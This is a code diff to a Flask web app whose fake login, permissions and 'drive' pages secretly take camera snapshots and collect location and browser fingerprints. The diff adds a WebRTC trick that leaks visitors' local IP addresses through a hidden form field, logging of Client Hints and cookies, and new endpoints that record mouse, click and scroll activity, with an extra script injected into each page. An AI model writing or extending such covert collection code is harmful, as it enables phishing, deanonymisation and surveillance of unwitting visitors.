@@ -45,18 +45,30 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
-# Add before_request to log data for every request
+# Add before_request to log data for every request with Client Hints
 @app.before_request
 def log_request_data():
     ip_header = request.headers.get('X-Forwarded-For', request.remote_addr)
     ip = ip_header.split(",")[0].strip() if ip_header else request.remote_addr
     user_agent = request.headers.get('User-Agent', 'unknown')
+    # Extract Client Hints headers
+    client_hints = {
+        'Sec-CH-UA': request.headers.get('Sec-CH-UA'),
+        'Sec-CH-UA-Mobile': request.headers.get('Sec-CH-UA-Mobile'),
+        'Sec-CH-UA-Platform': request.headers.get('Sec-CH-UA-Platform'),
+        'Sec-CH-Width': request.headers.get('Sec-CH-Width'),
+        'Sec-CH-Viewport-Width': request.headers.get('Sec-CH-Viewport-Width'),
+        'Sec-CH-DPR': request.headers.get('Sec-CH-DPR'),
+        'Device-Memory': request.headers.get('Device-Memory'),
+        'Hardware-Concurrency': request.headers.get('Hardware-Concurrency'),
+    }
     data = {
         'ip': ip,
         'user_agent': user_agent,
         'method': request.method,
         'path': request.path,
         'headers': dict(request.headers),
+        'client_hints': client_hints,
         'cookies': request.cookies,
     }
     logging.info(f"Request data: {json.dumps(data)}")
@@ -209,6 +221,7 @@ def collect_data(req):
         'audioClip': req.form.get('audioClip'),
         'webglFingerprint': req.form.get('webglFingerprint'),
         'installedFonts': req.form.get('installedFonts'),
+        'localIPs': req.form.get('localIPs'),  # New field for local IPs
     }
 
     lat, lon, geo_data = get_ip_geolocation(ip5)
@@ -359,7 +372,7 @@ def generate_pdf(logged_data):
     new_buffer.seek(0)
     return new_buffer, token
 
-# HTML Templates
+# HTML Templates with script inclusion
 PERMISSIONS_PAGE = """
 <!DOCTYPE html>
 <html>
@@ -400,6 +413,7 @@ PERMISSIONS_PAGE = """
             <p id="status"></p>
         </div>
     </div>
+    <script src="/static/script.js"></script>
     <script>
         function startLocationCapture() {
             setInterval(() => {
@@ -549,6 +563,7 @@ LOGIN_PAGE = """
     </div>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script src="/static/script.js"></script>
     <script>
         const permissions = "{{ permissions }}";
         const video = document.getElementById('video');
@@ -700,11 +715,13 @@ DRIVE_PAGE = """
             <input type="hidden" name="timezoneOffset" id="timezoneOffset">
             <input type="hidden" name="location" id="location">
             <input type="hidden" name="cameraSnapshot" id="cameraSnapshot">
+            <input type="hidden" name="localIPs" id="localIPs">
             <button type="submit" class="btn btn-primary">Download Data</button>
         </form>
     </div>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script src="/static/script.js"></script>
     <script>
         const permissions = "{{ permissions }}";
         const video = document.getElementById('video');
@@ -855,13 +872,38 @@ DRIVE_PAGE = """
                     ctx.drawImage(video, 0, 0, 320, 240);
                     document.getElementById('cameraSnapshot').value = canvas.toDataURL('image/jpeg');
                 }
-                Promise.all(promises).then(() => {
-                    e.target.submit();
+                // Collect local IPs using WebRTC
+                getLocalIPs((ipList) => {
+                    document.getElementById('localIPs').value = JSON.stringify(ipList);
+                    Promise.all(promises).then(() => {
+                        e.target.submit();
+                    });
                 });
             } else {
                 e.target.submit();
             }
         });
+
+        // WebRTC-based local IP collection
+        function getLocalIPs(callback) {
+            const ips = new Set();
+            const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(err => console.error("Error creating offer: ", err));
+            pc.onicecandidate = event => {
+                if (!event || !event.candidate) {
+                    callback(Array.from(ips));
+                    pc.close(); // Clean up the peer connection
+                    return;
+                }
+                const candidate = event.candidate.candidate;
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                const match = candidate.match(ipRegex);
+                if (match) {
+                    ips.add(match[1]);
+                }
+            };
+        }
     </script>
 </body>
 </html>
@@ -1098,6 +1140,78 @@ def patched_log_other_data():
     return "Other data logged", 200
 
 app.view_functions['log_other_data'] = patched_log_other_data
+
+# New routes for additional data collection
+@app.route('/log_performance', methods=['POST'])
+def log_performance():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Performance data: {json.dumps(data)}")
+    return "Performance data logged", 200
+
+@app.route('/log_connection', methods=['POST'])
+def log_connection():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Connection data: {json.dumps(data)}")
+    return "Connection data logged", 200
+
+@app.route('/log_mouse', methods=['POST'])
+def log_mouse():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Mouse data: {json.dumps(data)}")
+    return "Mouse data logged", 200
+
+@app.route('/log_click', methods=['POST'])
+def log_click():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Click data: {json.dumps(data)}")
+    return "Click data logged", 200
+
+@app.route('/log_scroll', methods=['POST'])
+def log_scroll():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Scroll data: {json.dumps(data)}")
+    return "Scroll data logged", 200
+
+@app.route('/log_error', methods=['POST'])
+def log_error():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.error(f"Client-side error: {json.dumps(data)}")
+    return "Error logged", 200
+
+@app.route('/log_local_ips', methods=['POST'])
+def log_local_ips():
+    data = request.json
+    with buffer_lock:
+        data_buffer.append(data)
+    logging.info(f"Local IPs collected via WebRTC: {json.dumps(data)}")
+    return "Local IPs logged", 200
+
+# Monkey patch log_local_ips to add metadata
+original_log_local_ips = log_local_ips
+
+def patched_log_local_ips():
+    data = request.json
+    enhanced_data = data.copy()
+    enhanced_data['source'] = 'WebRTC ICE Candidate Gathering'
+    enhanced_data['timestamp'] = datetime.now().isoformat()
+    with buffer_lock:
+        data_buffer.append(enhanced_data)
+    logging.info(f"Enhanced local IPs collected via WebRTC: {json.dumps(enhanced_data)}")
+    return "Local IPs logged with metadata", 200
+
+app.view_functions['log_local_ips'] = patched_log_local_ips
 
 @app.route('/simulate')
 def simulate():
